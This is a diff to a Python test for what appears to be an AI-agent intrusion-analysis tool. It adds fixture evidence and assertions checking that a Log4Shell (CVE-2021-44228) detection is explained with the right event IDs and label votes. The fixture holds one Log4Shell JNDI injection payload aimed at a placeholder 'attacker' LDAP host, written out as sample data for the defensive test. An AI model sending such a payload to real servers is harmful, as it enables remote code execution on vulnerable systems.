@@ -22,6 +22,16 @@ def main() -> None:
                 "score": 0.91,
                 "rule_confirmed": True,
                 "signals": ["log4shell_jndi"],
+                "event_ids": ["pkt-1"],
+                "label_votes": {"CVE-2021-44228": 2},
+                "evidence_details": [
+                    {
+                        "event_id": "pkt-1",
+                        "neighbor_id": "demo-log4shell",
+                        "neighbor_payload": "GET /?x=${jndi:ldap://attacker/a} HTTP/1.1",
+                        "neighbor_labels": ["CVE-2021-44228"],
+                    }
+                ],
             }
         ],
         "attack_timeline": [
@@ -57,6 +67,10 @@ def main() -> None:
     assert "CVE-2021-44228" in result["executive_summary"]
     assert any("C2 indicators" in item for item in result["key_findings"])
     assert len(result["agent_reasoning"]) == 4
+    vuln_reasoning = [item for item in result["agent_reasoning"] if item["agent"] == "Vulnerability Judge Agent"][0]
+    assert "pkt-1" in vuln_reasoning["evidence_ids"]
+    assert "demo-log4shell" in vuln_reasoning["reasoning"]
+    assert "CVE-2021-44228=2" in vuln_reasoning["reasoning"]
     assert any("198.51.100.53:53" in item for item in result["next_actions"])
 
 
